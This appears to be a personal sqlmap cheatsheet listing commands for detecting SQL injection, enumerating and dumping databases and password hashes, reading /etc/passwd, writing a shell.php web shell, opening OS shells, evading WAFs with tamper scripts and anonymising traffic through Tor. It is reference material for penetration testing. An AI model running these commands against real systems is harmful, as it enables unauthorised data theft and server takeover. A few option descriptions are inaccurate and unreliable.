# SQLMap Command Cheatsheet

## Basic Usage & Target Specification

### Target Options
```bash
# URL-based injection
sqlmap -u "http://example.com/page?id=1"

# Request file (recommended)
sqlmap -r request.txt

# Mark injection point with asterisk
In request.txt: GET /page?id=1* HTTP/1.1
```

### Basic Detection
```bash
# Basic injection detection
sqlmap -u "http://example.com/page?id=1"

# Using request file
sqlmap -r request.txt

# Flush session (start fresh)
sqlmap -r request.txt --flush-session
```

## Database Enumeration

### Database Discovery
```bash
# List all databases
sqlmap -r request.txt --dbs

# Get current database
sqlmap -r request.txt --current-db

# Specify database system (optimization)
sqlmap -r request.txt --dbms=mysql
sqlmap -r request.txt --dbms=postgresql
sqlmap -r request.txt --dbms=mssql
```

### Table Enumeration
```bash
# List tables in specific database
sqlmap -r request.txt -D database_name --tables

# List tables in current database
sqlmap -r request.txt --tables
```

### Column Enumeration
```bash
# List columns in specific table
sqlmap -r request.txt -D database_name -T table_name --columns

# List columns (current db)
sqlmap -r request.txt -T table_name --columns
```

### Data Extraction
```bash
# Dump entire table
sqlmap -r request.txt -D database_name -T table_name --dump

# Dump specific columns
sqlmap -r request.txt -D database_name -T table_name -C "username,password" --dump

# Dump all data from database
sqlmap -r request.txt -D database_name --dump-all

# Dump with conditions
sqlmap -r request.txt -D database_name -T table_name --where="id>100" --dump
```

## System Information

### User & Privileges
```bash
# Get current user
sqlmap -r request.txt --current-user

# Check if current user is DBA
sqlmap -r request.txt --is-dba

# List all database users
sqlmap -r request.txt --users

# Get user privileges
sqlmap -r request.txt --privileges

# Get user passwords
sqlmap -r request.txt --passwords
```

### System Details
```bash
# Get hostname
sqlmap -r request.txt --hostname

# Get database banner
sqlmap -r request.txt --banner
```

## Advanced Exploitation

### File Operations
```bash
# Read system files
sqlmap -r request.txt --file-read="/etc/passwd"
sqlmap -r request.txt --file-read="C:\Windows\System32\drivers\etc\hosts"

# Write files to system
sqlmap -r request.txt --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

### Command Execution
```bash
# Execute OS commands
sqlmap -r request.txt --os-cmd="whoami"
sqlmap -r request.txt --os-cmd="id"

# Get OS shell
sqlmap -r request.txt --os-shell

# Get SQL shell
sqlmap -r request.txt --sql-shell
```

## Detection & Testing Options

### Injection Techniques
```bash
# Specify techniques (B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline)
sqlmap -r request.txt --technique=B     # Boolean-based blind only
sqlmap -r request.txt --technique=T     # Time-based blind only
sqlmap -r request.txt --technique=U     # Union-based only
sqlmap -r request.txt --technique=BEUST # Multiple techniques
```

### Testing Levels & Risk
```bash
# Set testing level (1-5, default: 1)
sqlmap -r request.txt --level=3
sqlmap -r request.txt --level=5

# Set risk level (1-3, default: 1)
sqlmap -r request.txt --risk=2
sqlmap -r request.txt --risk=3

# Combine level and risk
sqlmap -r request.txt --level=5 --risk=3
```

### Blind Injection Options
```bash
# Specify string for true condition
sqlmap -r request.txt --string="Welcome"

# Specify string for false condition
sqlmap -r request.txt --not-string="Error"

# Set time delay for time-based injection
sqlmap -r request.txt --time-sec=10
```

## Performance & Stealth

### Traffic Control
```bash
# Add delay between requests (seconds)
sqlmap -r request.txt --delay=2

# Set number of threads
sqlmap -r request.txt --threads=5

# Set timeout
sqlmap -r request.txt --timeout=30
```

### Proxy & SSL
```bash
# Use proxy (for debugging with Burp)
sqlmap -r request.txt --proxy="http://127.0.0.1:8080"

# Force SSL/HTTPS
sqlmap -r request.txt --force-ssl

# Ignore SSL certificate errors
sqlmap -r request.txt --ignore-ssl-errors
```

### User Agent & Headers
```bash
# Random User-Agent
sqlmap -r request.txt --random-agent

# Custom User-Agent
sqlmap -r request.txt --user-agent="Custom Agent"

# Additional headers
sqlmap -r request.txt --headers="X-Custom: value"
```

## Bypass & Evasion

### WAF Bypass
```bash
# List available tamper scripts
sqlmap --list-tampers

# Use single tamper script
sqlmap -r request.txt --tamper=space2comment
sqlmap -r request.txt --tamper=randomcase
sqlmap -r request.txt --tamper=equaltolike

# Use multiple tamper scripts
sqlmap -r request.txt --tamper=space2comment,randomcase
```

### Common Tamper Scripts
```bash
# Space bypass
--tamper=space2comment       # Space to /**/
--tamper=space2plus         # Space to +
--tamper=space2randomblank  # Space to random blank char

# Case manipulation
--tamper=randomcase         # Random case keywords
--tamper=uppercase          # UPPERCASE keywords

# Character encoding
--tamper=charencode         # URL encoding
--tamper=charunicodeencode  # Unicode encoding

# Operator bypass
--tamper=equaltolike        # = to LIKE
--tamper=greatest           # > to GREATEST()
```

## Session & Output

### Session Management
```bash
# Flush session
sqlmap -r request.txt --flush-session

# Save session to file
sqlmap -r request.txt -s session.txt

# Load session from file
sqlmap -r request.txt -s session.txt
```

### Output Options
```bash
# Verbose output
sqlmap -r request.txt -v 3

# Save output to file
sqlmap -r request.txt --output-dir=/tmp/sqlmap

# Batch mode (non-interactive) - skip all prompts, use defaults
sqlmap -r request.txt --batch

# Answer yes to all questions
sqlmap -r request.txt --answers="quit=N,follow=Y"
```

## Common Command Combinations

### Quick Database Dump
```bash
# Full enumeration and dump
sqlmap -r request.txt --dbs --tables --columns --dump-all --batch

# Specific table dump with optimization
sqlmap -r request.txt -D webapp -T users -C "username,password,email" --dump --threads=5
```

### Stealth Mode
```bash
# Low and slow approach
sqlmap -r request.txt --delay=3 --timeout=30 --level=2 --risk=1 --tamper=randomcase,space2comment
```

### Aggressive Testing
```bash
# Maximum testing
sqlmap -r request.txt --level=5 --risk=3 --threads=10 --technique=BEUST --batch
```

### WAF Bypass Combination
```bash
# Multiple evasion techniques
sqlmap -r request.txt --delay=2 --random-agent --tamper=space2comment,randomcase,charencode --level=3
```

## POST Data & Forms

### POST Requests
```bash
# POST data injection
sqlmap -u "http://example.com/login" --data="username=admin&password=test"

# Mark POST parameter for injection
sqlmap -u "http://example.com/login" --data="username=admin*&password=test"

# JSON POST data
sqlmap -u "http://example.com/api" --data='{"id":1}' --headers="Content-Type: application/json"
```

### Cookie Injection
```bash
# Cookie parameter injection
sqlmap -u "http://example.com/page" --cookie="PHPSESSID=abc123; trackingId=xyz*"

# Level 2+ required for cookie testing
sqlmap -u "http://example.com/page" --cookie="id=1" --level=2
```

## Injection Point Marking

### Mark Injection Points with Asterisk (*)
```bash
# Mark injection point in URL parameter
sqlmap -u "http://example.com/page?id=1*"

# Mark injection point in POST data
sqlmap -u "http://example.com/login" --data="username=admin*&password=test"

# Mark injection point in Cookie
sqlmap -u "http://example.com/page" --cookie="sessionid=abc123; trackingId=xyz*"

# Mark injection point in custom header
sqlmap -u "http://example.com/page" --header="X-Custom-Header=Value*"

# Mark injection point in JSON data
sqlmap -u "http://example.com/api" --data='{"id":1*,"user":"admin"}' --headers="Content-Type: application/json"
```

## Request Methods & Headers

### HTTP Methods
```bash
# Specify HTTP method explicitly
sqlmap -u "http://example.com/api" --method=GET
sqlmap -u "http://example.com/api" --method=POST --data="param=value"
sqlmap -u "http://example.com/api" --method=PUT --data='{"id":1}'
sqlmap -u "http://example.com/api" --method=DELETE
```

### Headers Management
```bash
# Pass specific cookie header
sqlmap -u "http://example.com/page" --cookie="sessionid=abc123"

# Pass multiple headers using -H/--header
sqlmap -u "http://example.com/page" -H "Authorization: Bearer token123"
sqlmap -u "http://example.com/page" --header "X-Forwarded-For: 127.0.0.1"

# Multiple headers
sqlmap -u "http://example.com/page" -H "X-Real-IP: 1.2.3.4" -H "User-Agent: Custom"
```

### POST Data
```bash
# Basic POST data
sqlmap -u "http://example.com/login" --data="username=admin&password=test"

# POST with custom content type
sqlmap -u "http://example.com/api" --data='{"user":"admin"}' -H "Content-Type: application/json"

# POST with form data
sqlmap -u "http://example.com/form" --data="field1=value1&field2=value2"
```

## Automation & Discovery

### Automatic Target Discovery
```bash
# Crawl website for injection points
sqlmap -u "http://example.com" --crawl=2

# Test forms automatically
sqlmap -u "http://example.com/login.php" --forms

# Google dork integration
sqlmap -g "inurl:php?id="

# Batch processing with crawling
sqlmap -u "http://example.com" --crawl=3 --batch --forms
```

## Request Import & Conversion

### From Browser/Curl to SQLMap
```bash
# Copy request from browser as curl, save to file, then:
# Replace 'curl' with 'sqlmap' in the command

# Example conversion:
curl -X POST "http://example.com/login" -d "user=admin&pass=test" -H "Cookie: session=abc"
# becomes:
sqlmap -X POST "http://example.com/login" -d "user=admin&pass=test" -H "Cookie: session=abc"

# Or save curl command to file and use:
sqlmap -r request_from_curl.txt
```

NEW ADDONS:

payloads consist of 2 parts.

one is attack vector, the actual injection string.
the other is boundaries, prefix and suffix. which wraps the vector to make it a valid query with the oringial one.

--suffix

to give a suffix to the payloads.

--prefix

to give a prefix to the payloads.

-v 

to show the payloads in the resposne

--level=

to set the level of tests to perform, from 1 to 5. higher levels include more tests and focsues on multiple entry ppints like referrers, cookies, user agents etc.

--risk=

to set the risk,

Risk Level	Description	Example Payloads / Behaviors	When to Use
Risk 1 (Default)	Safe & Default. Uses a large number of low-intrusive, standard SQL injection tests. These are mostly SELECT-based statements.	' OR 1=1-- -
' AND 1=2 UNION ALL SELECT...	Always start here. It's safe for the vast majority of testing.
Risk 2	Adds time-based blind SQL injection tests. Enables heavier and more time-consuming queries.	Adds payloads like:
' OR SLEEP(5)-- -
'; WAITFOR DELAY '0:0:5'-- -	When Risk 1 finds nothing, or you specifically suspect a time-based blind vulnerability.
Risk 3	Adds OR-based boolean tests. This is the dangerous level, as OR conditions can affect UPDATE or DELETE statements.	Adds payloads like:
' OR 'a'='a'
If injected into a UPDATE users SET password='...' WHERE id=1, it could become:
UPDATE users SET password='' OR 'a'='a' WHERE id=1
This would reset passwords for ALL users!


--parse-errors

to enable parsing of DBMS error messages for more accurate injection detection and exploitation.

--proxy=''

to route traffic through a proxy server for monitoring or debugging purposes.


We can differentiate between valid or invalid results by

--code=200
for change in response code

--titles

for change in page titles

--string=''

for presence of a string in the response

--text-only

to ignore HTML tags and focus on textual content changes in the response.


--tehcnique=

to specify which SQL injection techniques to use. Options include:
B: Boolean-based blind
E: Error-based
U: Union-based
S: Stacked queries
T: Time-based blind
Q: Inline queries

--union-cols=<number>

to specify the number of columns for UNION-based injections.

--union-char=<char>
to specify a character to use for UNION-based injections.

--union-from=<table>

to specify a table to use for UNION-based injections for some dbms which is requied by some dbms like postgresql.


Enumeration


Database version banner (switch --banner)
Current user name (switch --current-user)
all database names (switch --dbs)
Current database name (switch --current-db)
Checking if the current user has DBA (administrator) rights (switch --is-dba)

Table and Column Enumeration

List of tables in a database (switch -D <database> --tables)
List of columns in a table (switch -D <database> -T <table> --
columns)
List rows of only specific columns (switch -C <column1,column2,...>)

--start=<row>
to specify the starting row for data dumping.

--stop=<row>
to specify the ending row for data dumping.
to limit the number of rows to dump.

Conditional enumeration

--where='<condition>'
to specify a condition for data dumping.

Full DB enumeration

--dump-all
to dump all databases, tables, and columns.

--dump
to dump the contents of a specified table.

--dump -D <database> -T <table>
to dump a specific table from a specific database.

--exclude-sysdbs
to exclude system databases from enumeration and dumping.

Data Extraction formatting options

--dump-format=CSV
to dump data in CSV format.

--dump-format=HTML
to dump data in HTML format.

--dump-format=SQL
to dump data in SQL format.


--schema 
to get schema of all the tables 

--search -T <table> -C <column> -S <string>
to search for a specific string in a given table and column.

--passwords
to retrieve user passwords from the database.

--all 
to perform all enumeration options in one go when used in combination with --batch.

--csrf-token=<token_parameter_name>
to specify a CSRF token for requests that require it.

--randomize=<parameter_name>
to randomize the value of a specific parameter for each request.


--eval='<python_expression>'
to evaluate a Python expression and use its result in the injection payloads.

--proxy='<proxy_url>'
to route traffic through a proxy server for monitoring or debugging purposes

--proxy-file='<file_path>'
to read a list of proxy servers from a file and rotate through them for each request.

--tor
to route traffic through the Tor network for anonymity.

--check-tor
to check if the Tor connection is working properly.

--skip-waf
to skip WAF detection and evasion techniques.

--random-agent
to use a random User-Agent header for each request to evade detection.

Tamper scripts

--tamper=<script1,script2,...>
to specify one or more tamper scripts to modify the payloads for evasion.

--chunked
to enable chunked transfer encoding for requests or to use http parameter pollution techniques.